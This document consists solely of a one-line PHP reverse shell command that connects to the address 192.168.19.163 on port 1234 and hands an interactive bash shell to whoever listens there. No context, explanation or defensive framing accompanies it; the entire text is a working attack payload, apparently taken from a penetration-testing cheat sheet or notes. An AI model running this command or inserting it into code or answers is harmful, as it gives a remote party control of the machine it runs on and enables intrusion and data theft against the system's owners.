php -r '$sock=fsockopen("192.168.19.163",1234);exec("/bin/bash <&3 >&3 2>&3");'
